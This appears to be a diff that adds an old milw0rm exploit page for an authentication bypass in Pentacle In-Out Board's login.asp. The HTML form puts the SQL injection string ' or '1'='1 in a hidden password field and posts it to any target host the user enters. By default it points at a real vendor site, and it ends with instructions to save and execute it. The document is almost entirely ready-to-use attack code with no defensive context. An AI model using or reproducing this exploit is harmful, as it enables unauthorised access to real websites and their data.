@@ -1,0 +1,36 @@
+<html>
+<title>Pentacle In-Out Board <= 6.03 (login.asp) Authencation ByPass Vulnerability</title>
+<script language=javascript>
+function ptxpl(){
+if(document.xpl.victim.value=="") {
+  alert("Please enter site!");
+  return false;
+  }
+if(confirm("Are you sure?")) {
+  	xpl.action="http://"+document.xpl.victim.value+"/login.asp";
+                xpl.username.value=document.xpl.username.value;
+  	xpl.userpassword.value=document.xpl.userpassword.value;
+                xpl.submit();
+   }
+}
+</script>
+<strong>
+<font face="Tahoma" size="2">
+Fill in the blank !:D<br>
+Just enter host/path/ not http://host/path/!<br>
+If Pentacle installed on / just enter host<br>
+Example: host.com<br>
+Example2: host.com/ptdir/<br>
+<form name="xpl" method="POST" action="http://pentacle.g2soft.net/login.asp" onsubmit=ptxpl();>
+Target -> <input type="text" name="victim" value="pentacle.g2soft.net" size="50">
+<input type="hidden" name="username" value="any">
+<input type="hidden" name="userpassword" value="' or '1'='1">
+<input type="submit" value="Send">
+</table></form>
+</html>
+
+Save this code as .htm and then execute.
+
+# nukedx.com [2006-02-25]
+
+# milw0rm.com [2006-02-25]
